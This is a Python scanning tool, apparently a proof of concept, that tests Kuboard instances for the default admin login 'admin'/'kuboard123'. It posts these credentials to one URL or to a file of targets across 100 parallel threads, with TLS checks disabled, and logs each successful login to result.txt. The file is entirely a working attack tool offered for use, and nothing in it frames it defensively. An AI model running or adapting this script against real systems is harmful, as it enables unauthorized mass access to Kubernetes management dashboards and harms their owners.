import requests
import argparse
import sys
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'


def banner():
    test = """
  _          _                         _ 
 | |        | |                       | |
 | | ___   _| |__   ___   __ _ _ __ __| |
 | |/ / | | | '_ \\ / _ \\ / _` | '__/ _` |
 |   <| |_| | |_) | (_) | (_| | | | (_| |
 |_|\_\\__,_|_.__/ \\___/ \\__,_|_|  \\__,_|                                                                                                                      
                        version:1.1.0                     
                        author:Hardog
"""
    print(test)


def main():
    banner()

    parser = argparse.ArgumentParser(description='Kuboard 默认口令漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='File Path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    credentials = {
        "username": "admin",
        "password": "kuboard123"
    }

    try:
        # 发送POST请求以尝试登录
        response = requests.post(url=target, json=credentials, verify=False,timeout=5)

        # 检查响应状态码
        if response.status_code == 200:
            print(f"{GREEN}[+] 登录成功！{target}，请访问 {response.json()}\n{RESET}")
            with open('result.txt', 'a', encoding='utf-8') as fp:
                fp.write(target + '\n')
        else:
            print(f"[-] 登录失败!")

    except Exception as e:
        print("[*] 无法访问")

if __name__ == '__main__':
    main()